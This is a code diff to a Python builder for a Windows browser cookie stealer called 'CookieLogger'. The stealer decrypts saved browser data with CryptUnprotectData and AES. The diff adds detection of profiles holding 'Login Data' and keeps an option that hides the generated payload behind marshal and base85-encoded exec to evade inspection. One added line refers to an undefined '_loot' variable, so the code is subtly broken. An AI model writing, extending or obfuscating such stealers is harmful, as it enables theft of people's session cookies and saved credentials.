@@ -19,9 +19,7 @@ import json
 import base64
 import shutil
 import sqlite3
-import io
 import requests
-import traceback
 import subprocess
 
 from win32crypt import CryptUnprotectData
@@ -78,8 +76,10 @@ class CookieLogger:
                             if file == "Local State":
                                 if "Default" in os.listdir(_root):
                                     found.append([_root, True])
+                                elif "Login Data" in os.listdir(_root):
+                                    found.append([_loot, False])
                                 else:
-                                    found.append([_root, False])
+                                    pass
                 except Exception:
                     pass
 
@@ -119,7 +119,6 @@ class CookieLogger:
         try:
             masterKey = self.getMasterKey(browserPath)
         except Exception:
-            traceback.print_exc()
             return cookiesFound
 
         if isProfiled:
@@ -174,11 +173,12 @@ class CookieLogger:
 
 if __name__ == "__main__":
     CookieLogger()
+
 """
 
 if obfuscate.lower().startswith("Y"):
     newcode = f"""
-    import os;import json;import base64;import shutil;import sqlite3;import io;import requests;import traceback;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))
+    import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))
     """
 else:
     newcode = code
